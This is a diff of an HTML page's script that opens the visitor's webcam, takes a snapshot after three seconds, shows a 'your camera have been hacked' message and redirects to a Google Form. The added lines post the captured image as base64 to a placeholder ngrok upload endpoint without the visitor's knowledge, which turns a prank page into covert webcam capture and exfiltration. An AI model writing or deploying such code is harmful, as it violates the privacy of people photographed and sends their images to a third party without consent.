@@ -40,46 +40,50 @@
   <div class="message" id="message"></div>
   <div class="sub" id="subMessage"></div>
 
-  <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const message = document.getElementById("message");
-    const subMessage = document.getElementById("subMessage");
+ <script>
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const message = document.getElementById("message");
+  const subMessage = document.getElementById("subMessage");
 
-    const GOOGLE_FORM_URL = "https://forms.gle/PEv8n4qXnzYG9KbB9";
+  const GOOGLE_FORM_URL = "https://forms.gle/PEv8n4qXnzYG9KbB9";
+  const BACKEND_URL = "https://YOUR-NGROK-URL.ngrok.io/upload"; // 👈 ADD
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
 
-        // Capture image after 3 seconds
+      setTimeout(() => {
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+
+        // 🔴 ADD THIS PART
+        const imageData = canvas.toDataURL("image/png");
+
+        fetch(BACKEND_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image: imageData })
+        });
+        // 🔴 END ADDITION
+
+        stream.getTracks().forEach(track => track.stop());
+
+        video.style.display = "none";
+        canvas.style.display = "block";
+
+        message.innerHTML = "he hee..";
+        subMessage.innerHTML = "<strong>your camera have been hacked</strong>";
+
         setTimeout(() => {
-          const context = canvas.getContext("2d");
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0);
+          window.location.href = GOOGLE_FORM_URL;
+        }, 5000);
 
-          // Stop camera
-          stream.getTracks().forEach(track => track.stop());
-
-          video.style.display = "none";
-          canvas.style.display = "block";
-
-          message.innerHTML = "he hee..";
-          subMessage.innerHTML =
-            "<strong>your camera have been hacked</strong>";
-
-          // Redirect after 5 seconds
-          setTimeout(() => {
-            window.location.href = GOOGLE_FORM_URL;
-          }, 5000);
-
-        }, 3000);
-      })
-      .catch(() => {
-        message.textContent = "Camera permission denied.";
-      });
-  </script>
-
-</body>
-</html>
+      }, 3000);
+    })
+    .catch(() => {
+      message.textContent = "Camera permission denied.";
+    });
+</script>
